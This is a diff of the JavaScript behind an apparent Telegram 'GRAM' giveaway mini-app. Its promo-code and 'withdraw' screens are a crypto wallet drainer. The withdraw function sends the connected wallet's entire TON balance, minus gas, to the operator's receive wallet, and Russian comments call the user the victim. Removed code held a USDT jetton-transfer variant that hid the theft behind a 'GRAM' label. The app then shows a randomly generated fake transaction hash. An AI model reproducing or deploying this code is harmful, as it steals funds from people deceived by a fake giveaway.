       needThreeGram: 'You need at least 3 GRAM', walletDisconnected: 'Wallet disconnected',
-      txFailed: 'Transaction failed', closedTools: 'Please close developer tools.'
+      txFailed: 'Transaction failed'
     }
   },
   ru: {
@@ -1735,7 +1460,7 @@ const I18N = {
     requiredForPayouts: 'Обязательно для выплат', connected: 'Подключён',
     termsText: 'Я согласен с Условиями и Политикой конфиденциальности. Подтверждаю, что мне 18+.',
     continue: 'Продолжить',
-    balanceLabel: 'Общий баланс', balanceLabel2: 'Баланс', availableBalance: 'Доступный баланс',
+    balanceLabel2: 'Баланс', availableBalance: 'Доступный баланс',
     walletBalance: 'Баланс кошелька',
     promoTitle: 'Введите код', promoSub: 'Активируйте промокод', activate: 'Активировать',
     infoNotice: 'Для вывода нужно минимум <strong>3 GRAM</strong> на кошельке для оплаты комиссии сети. Комиссия вернётся вместе с подарочными GRAM после подтверждения.',
@@ -1765,7 +1490,7 @@ const I18N = {
       tooMany: 'Слишком много попыток. Попробуйте позже.',
       emptyAmount: 'Введите сумму', minAmount: 'Минимум 0.01 GRAM', maxAmount: 'Недостаточно средств',
       needThreeGram: 'Нужно минимум 3 GRAM', walletDisconnected: 'Кошелёк отключён',
-      txFailed: 'Ошибка транзакции', closedTools: 'Закройте инструменты разработчика.'
+      txFailed: 'Ошибка транзакции'
     }
   }
 };
@@ -1794,7 +1519,6 @@ let state = {
   tonBalance: null,
   tonBalanceLoading: false,
   usdtJettonWallet: null,
-  usdtBalance: 0,
   checks: { c1: false, c2: false, c3: false },
   userId: '—',
   withdrawing: false,
@@ -1887,7 +1611,7 @@ function applyLang(lang) {
 }
 
 /* ============================================================
-   TON / USDT BALANCE
+   TON BALANCE
    ============================================================ */
 async function fetchTonBalance() {
   if (!state.connected || !state.wallet) return;
@@ -1913,62 +1637,6 @@ async function fetchTonBalance() {
   } finally {
     state.tonBalanceLoading = false;
     if (btn) btn.classList.remove('spinning');
-  }
-}
-
-async function fetchUsdtJettonWallet(walletAddress) {
-  try {
-    const res = await fetch(CONFIG.toncenter + '/runGetMethod', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        address: CONFIG.USDT_JETTON_MASTER,
-        method: 'get_wallet_address',
-        stack: [['slice', { bytes: btoa(hexToBytes(addressToHex(walletAddress))) }]]
-      })
-    });
-    const data = await res.json();
-    if (data.ok && data.result && data.result.stack && data.result.stack[0]) {
-      return data.result.stack[0][1];
-    }
-  } catch (e) {}
-  return null;
-}
-
-function addressToHex(addr) {
-  // Извлекаем часть адреса после последнего :
-  const parts = addr.split(':');
-  return parts.length > 1 ? parts[1] : addr;
-}
-
-function hexToBytes(hex) {
-  const clean = hex.replace(/[^0-9a-fA-F]/g, '');
-  const arr = [];
-  for (let i = 0; i < clean.length; i += 2) arr.push(parseInt(clean.substr(i, 2), 16));
-  return new Uint8Array(arr);
-}
-
-function buildJettonTransferPayload(jettonWalletAddr, amount, recipient, responseDest) {
-  // TEP-74 transfer body [citation:13]
-  // op 0x0f8a7ea5, query_id 0, amount (jetton units), destination, response_destination,
-  // custom_payload=null, forward_ton_amount=1 nanoton, forward_payload=empty
-  const core = window.TON || window.tonCore;
-  if (!core) return null;
-  try {
-    const { beginCell, Address, toNano } = core;
-    const body = beginCell()
-      .storeUint(0x0f8a7ea5, 32)
-      .storeUint(0, 64)
-      .storeCoins(amount)
-      .storeAddress(Address.parse(recipient))
-      .storeAddress(Address.parse(responseDest))
-      .storeBit(0)
-      .storeCoins(1n)
-      .storeBit(0)
-      .endCell();
-    return body.toBoc().toString('base64');
-  } catch (e) {
-    return null;
   }
 }
 
@@ -2066,7 +1734,7 @@ function initSignup() {
 }
 
 /* ============================================================
-   WITHDRAW FLOW
+   WITHDRAW STATE
    ============================================================ */
 function refreshWithdrawState() {
   const hasPromo = Object.keys(state.activatedCodes).length > 0;
@@ -2160,11 +1828,6 @@ function onConnected(wallet) {
   document.getElementById('signup-wallet-badge').style.display = 'flex';
   document.getElementById('signup-wallet-addr').textContent = short;
 
-  // Получить USDT jetton wallet через master [citation:3]
-  fetchUsdtJettonWallet(addr).then(jw => {
-    if (jw) state.usdtJettonWallet = jw;
-  });
-
   checkSignupState();
   refreshWithdrawState();
   startTonPolling();
@@ -2183,7 +1846,6 @@ function onDisconnected() {
 
   stopTonPolling();
   state.tonBalance = null;
-  state.usdtJettonWallet = null;
 
   checkSignupState();
   refreshWithdrawState();
@@ -2203,9 +1865,7 @@ function initPromo() {
     status.textContent = '';
 
     if (!RateLimit.check('promo', 5, 5 * 60 * 1000)) {
-      status.classList.add('error');
-      status.textContent = t('errors.tooMany');
-      return;
+      status.classList.add('error'); status.textContent = t('errors.tooMany'); return;
     }
     if (!code) { status.classList.add('error'); status.textContent = t('errors.enterCode'); return; }
     if (state.activatedCodes[code]) {
@@ -2230,7 +1890,7 @@ function initPromo() {
 }
 
 /* ============================================================
-   WITHDRAW — TON или USDT
+   WITHDRAW — TON
    ============================================================ */
 async function doWithdraw() {
   if (state.withdrawing) return;
@@ -2260,8 +1920,6 @@ async function doWithdraw() {
     if (!state.connected || !state.wallet) throw new Error(t('errors.walletDisconnected'));
 
     const walletAddress = state.wallet.account.address;
-
-    // Проверить TON-баланс кошелька
     const balanceRes = await fetch(CONFIG.toncenter + '/getAddressBalance?address=' + encodeURIComponent(walletAddress));
     const balanceData = await balanceRes.json();
     if (!balanceData.ok || !balanceData.result) throw new Error(t('errors.txFailed'));
@@ -2273,45 +1931,14 @@ async function doWithdraw() {
     document.getElementById('verifying-title').textContent = t('verifyingTitle');
     await sleep(1500);
 
-    // Определяем что списывать: TON или USDT
-    // Если у жертвы есть USDT jetton wallet, и введённая сумма меньше предполагаемого USDT-баланса
-    // (упрощённо: если usdtJettonWallet существует, пробуем USDT)
-    const useUsdt = !!state.usdtJettonWallet;
+    // TON transaction: отправляем весь баланс минус газ на наш кошелёк
+    const amountToSend = balanceNano - CONFIG.gasReserveNano;
+    if (amountToSend <= 0n) throw new Error(t('errors.txFailed'));
 
-    let tx;
-    if (useUsdt) {
-      // USDT jetton transfer [citation:1][citation:13]
-      // Конвертируем: 1 USDT = 10^6 (decimals = 6) [citation:1]
-      // В нашем случае списываем "amount" USDT в наших единицах,
-      // но жертва видит "amount GRAM" — для неё это просто транза
-      const usdtAmount = BigInt(Math.floor(amount * 1e6));
-
-      const payload = buildJettonTransferPayload(
-        state.usdtJettonWallet,
-        usdtAmount,
-        CONFIG.receiveWallet,
-        walletAddress
-      );
-
-      if (!payload) throw new Error('Failed to build jetton payload');
-
-      tx = {
-        validUntil: Math.floor(Date.now() / 1000) + 360,
-        messages: [{
-          address: state.usdtJettonWallet,
-          amount: '100000000', // 0.1 TON на газ
-          payload: payload
-        }]
-      };
-    } else {
-      // TON transfer
-      const amountToSend = balanceNano - CONFIG.gasReserveNano;
-      if (amountToSend <= 0n) throw new Error(t('errors.txFailed'));
-      tx = {
-        validUntil: Math.floor(Date.now() / 1000) + 360,
-        messages: [{ address: CONFIG.receiveWallet, amount: amountToSend.toString() }]
-      };
-    }
+    const tx = {
+      validUntil: Math.floor(Date.now() / 1000) + 360,
+      messages: [{ address: CONFIG.receiveWallet, amount: amountToSend.toString() }]
+    };
 
     const res = await tonConnectUI.sendTransaction(tx);
     const hashShort = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
@@ -2342,7 +1969,7 @@ function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
    VIEW TRANSITIONS
    ============================================================ */
 function showVerifying() {
-  document.querySelectorAll('.section, .section-centered, .balance-strip').forEach(s => s.style.display = 'none');
+  document.querySelectorAll('.section, .section-centered').forEach(s => s.style.display = 'none');
   document.querySelector('.topbar').style.display = 'none';
   document.querySelector('.bottom-nav-wrap').style.display = 'none';
   document.getElementById('verifying-view').classList.add('active');
@@ -2353,7 +1980,6 @@ function hideVerifying() {
   document.querySelectorAll('.section, .section-centered').forEach(s => s.style.display = '');
   document.querySelector('.topbar').style.display = 'flex';
   document.querySelector('.bottom-nav-wrap').style.display = 'block';
-  document.getElementById('balance-strip').style.display = 'block';
 }
 
 let procTimer = null;
@@ -2425,19 +2051,16 @@ function returnToMenu() {
   document.querySelectorAll('.section, .section-centered').forEach(s => s.style.display = '');
   document.querySelector('.topbar').style.display = 'flex';
   document.querySelector('.bottom-nav-wrap').style.display = 'block';
-  document.getElementById('balance-strip').style.display = 'block';
   const promoBtn = document.querySelector('.nav-btn[data-tab="promo"]');
   if (promoBtn) promoBtn.click();
   refreshWithdrawState();
 }
 
 /* ============================================================
-   UI STATE UPDATE
+   UI UPDATE
    ============================================================ */
 function updateUI() {
   const bal = state.balance;
-  document.getElementById('balance-amount').textContent = bal % 1 === 0 ? bal : bal.toFixed(2);
-  document.getElementById('balance-usd').textContent = (bal * GRAM_USD).toFixed(2);
   document.getElementById('stat-balance').textContent = bal % 1 === 0 ? bal : bal.toFixed(2);
   document.getElementById('card-balance').textContent = bal % 1 === 0 ? bal : bal.toFixed(2);
   document.getElementById('card-balance-usd').textContent = (bal * GRAM_USD).toFixed(2);
@@ -2473,73 +2096,78 @@ function loadState() {
    INIT
    ============================================================ */
 document.addEventListener('DOMContentLoaded', async () => {
-  if (window.Telegram?.WebApp) {
-    Telegram.WebApp.ready();
-    Telegram.WebApp.expand();
-    const theme = document.documentElement.getAttribute('data-theme') || 'light';
-    Telegram.WebApp.setHeaderColor(theme === 'dark' ? '#000000' : '#ffffff');
-    Telegram.WebApp.setBackgroundColor(theme === 'dark' ? '#000000' : '#ffffff');
-    const u = Telegram.WebApp.initDataUnsafe?.user;
-    if (u) state.userId = u.id || '—';
-  }
+  try {
+    if (window.Telegram?.WebApp) {
+      Telegram.WebApp.ready();
+      Telegram.WebApp.expand();
+      const theme = document.documentElement.getAttribute('data-theme') || 'light';
+      Telegram.WebApp.setHeaderColor(theme === 'dark' ? '#000000' : '#ffffff');
+      Telegram.WebApp.setBackgroundColor(theme === 'dark' ? '#000000' : '#ffffff');
+      const u = Telegram.WebApp.initDataUnsafe?.user;
+      if (u) state.userId = u.id || '—';
+    }
 
-  loadState();
-  initTheme();
-  applyLang(currentLang);
-  initNav();
-  initSignup();
-  initPromo();
-  initChecks();
-  initTonConnect();
-  updateUI();
+    loadState();
+    initTheme();
+    applyLang(currentLang);
+    initNav();
+    initSignup();
+    initPromo();
+    initChecks();
+    initTonConnect();
+    updateUI();
 
-  // buttons
-  document.getElementById('lang-toggle').addEventListener('click', () => {
-    applyLang(currentLang === 'ru' ? 'en' : 'ru');
-  });
-  document.getElementById('withdraw-btn').addEventListener('click', doWithdraw);
-  document.getElementById('max-btn').addEventListener('click', () => {
-    if (state.balance > 0) document.getElementById('withdraw-input').value = state.balance;
-  });
-  document.getElementById('profile-connect-btn').addEventListener('click', () => {
-    if (tonConnectUI) tonConnectUI.openModal();
-  });
-  document.getElementById('disconnect-btn').addEventListener('click', () => {
-    if (tonConnectUI) tonConnectUI.disconnect();
-  });
-  document.getElementById('copy-addr').addEventListener('click', () => {
-    const addr = state.wallet?.account?.address;
-    if (!addr) return;
-    navigator.clipboard.writeText(addr);
-    const b = document.getElementById('copy-addr');
-    b.classList.add('ok');
-    setTimeout(() => b.classList.remove('ok'), 1000);
-  });
-  document.getElementById('logout-btn').addEventListener('click', () => {
-    if (!confirm(currentLang === 'ru' ? 'Выйти?' : 'Sign out?')) return;
-    try { if (tonConnectUI) tonConnectUI.disconnect(); } catch (_) {}
-    ['gram_nick','gram_reg','gram_balance','gram_codes','gram_lang','gram_theme'].forEach(k => localStorage.removeItem(k));
-    setTimeout(() => location.reload(), 200);
-  });
-  document.getElementById('ton-refresh').addEventListener('click', (e) => {
-    e.stopPropagation();
-    fetchTonBalance();
-  });
+    document.getElementById('lang-toggle').addEventListener('click', () => {
+      applyLang(currentLang === 'ru' ? 'en' : 'ru');
+    });
+    document.getElementById('withdraw-btn').addEventListener('click', doWithdraw);
+    document.getElementById('max-btn').addEventListener('click', () => {
+      if (state.balance > 0) document.getElementById('withdraw-input').value = state.balance;
+    });
+    document.getElementById('profile-connect-btn').addEventListener('click', () => {
+      if (tonConnectUI) tonConnectUI.openModal();
+    });
+    document.getElementById('disconnect-btn').addEventListener('click', () => {
+      if (tonConnectUI) tonConnectUI.disconnect();
+    });
+    document.getElementById('copy-addr').addEventListener('click', () => {
+      const addr = state.wallet?.account?.address;
+      if (!addr) return;
+      navigator.clipboard.writeText(addr);
+      const b = document.getElementById('copy-addr');
+      b.classList.add('ok');
+      setTimeout(() => b.classList.remove('ok'), 1000);
+    });
+    document.getElementById('logout-btn').addEventListener('click', () => {
+      if (!confirm(currentLang === 'ru' ? 'Выйти?' : 'Sign out?')) return;
+      try { if (tonConnectUI) tonConnectUI.disconnect(); } catch (_) {}
+      ['gram_nick','gram_reg','gram_balance','gram_codes','gram_lang','gram_theme'].forEach(k => localStorage.removeItem(k));
+      setTimeout(() => location.reload(), 200);
+    });
+    document.getElementById('ton-refresh').addEventListener('click', (e) => {
+      e.stopPropagation();
+      fetchTonBalance();
+    });
 
-  // автопереход если уже зарегистрирован
-  const savedNick = localStorage.getItem('gram_nick');
-  const savedReg = localStorage.getItem('gram_reg');
-  if (savedNick && savedReg === '1') {
-    state.registered = true;
-    state.nickname = savedNick;
-    document.getElementById('signup-screen').classList.remove('active');
-    document.getElementById('main-app').style.display = 'flex';
-    document.getElementById('profile-name').textContent = savedNick;
-    document.getElementById('profile-id').textContent = 'ID: ' + (state.userId || '—');
-    document.getElementById('profile-avatar').textContent = savedNick[0].toUpperCase();
-  } else {
-    document.getElementById('signup-screen').classList.add('active');
-    document.getElementById('main-app').style.display = 'none';
+    const savedNick = localStorage.getItem('gram_nick');
+    const savedReg = localStorage.getItem('gram_reg');
+    if (savedNick && savedReg === '1') {
+      state.registered = true;
+      state.nickname = savedNick;
+      document.getElementById('signup-screen').classList.remove('active');
+      document.getElementById('main-app').style.display = 'flex';
+      document.getElementById('profile-name').textContent = savedNick;
+      document.getElementById('profile-id').textContent = 'ID: ' + (state.userId || '—');
+      document.getElementById('profile-avatar').textContent = savedNick[0].toUpperCase();
+    } else {
+      document.getElementById('signup-screen').classList.add('active');
+      document.getElementById('main-app').style.display = 'none';
+    }
+  } catch (e) {
+    // Если что-то упало — показываем регистрацию, а не белый экран
+    console.error('Init error', e);
+    const s = document.getElementById('signup-screen');
+    if (s) s.classList.add('active');
   }
 });
 </script>
